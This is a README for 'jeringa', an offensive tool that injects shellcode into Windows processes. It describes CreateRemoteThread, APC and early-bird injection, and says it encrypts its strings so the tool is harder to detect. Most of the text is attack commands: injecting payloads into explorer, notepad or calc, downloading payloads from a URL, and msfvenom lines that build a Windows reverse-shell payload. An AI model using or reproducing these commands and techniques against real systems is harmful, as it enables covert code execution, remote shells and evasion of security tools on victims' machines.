# jeringa

Tool for easy process injection. It implements several types of process injection and uses dynamic function loading using delegates and AES to encrypt all the strings, so the function names are not easiliy retrievable.
- Process listing: By process name or process owner
- Payload: As input argument or using a url to download it
- Process injection via:
    - inject-crt: OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    - inject-apc: OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC 
    - earlybird:  CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread


### Process information

Option "list" to enumerate all processes or filter by name or owner:

```
jeringa.exe list [ all | PROCESS_NAME | PROCESS_OWNER]
```

Example: List all processes:

```
jeringa.exe list all
```

Example: List processes with a specific name ("explorer") or process owner ("DESKTOP-MA54241\ricardo"):

```
jeringa.exe list explorer
jeringa.exe list "DESKTOP-MA54241\ricardo"
```

###  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.

```
jeringa.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
```

Example: Injection using process name, process owner and payload in HEX format:

```
jeringa.exe inject-crt explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8...
```

Example: Injection using PID ("1234") and a url to download the payload:

```
jeringa.exe inject-crt 1234 http://127.0.0.1/payload.bin
```

###  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url. 

For this one you must wait until the thread enters in alertable state, you can try it using Notepad and the option "Save as".

```
jeringa.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
```

Example: Injection using process name, process owner and payload in HEX format:

```
jeringa.exe inject-apc explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8...
```

Example: Injection using PID ("1234") and a url to download the payload:

```
jeringa.exe inject-apc 1234 http://127.0.0.1/payload.bin
```

###  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)

You only set the program path. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.

Example: Injection using program path and payload in HEX format:

```
jeringa.exe earlybird "c:\windows\system32\notepad.exe" fc4883e4f0e8...
```

Example: Injection using program path and a url to download the payload:

```
jeringa.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payload.bin
```

### Payload generation

You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in raw format.

Example: Create payload in HEX format using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\x' | tr -d '"\n\\x;'
```

Example: Create payload in raw format for url option using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin
```
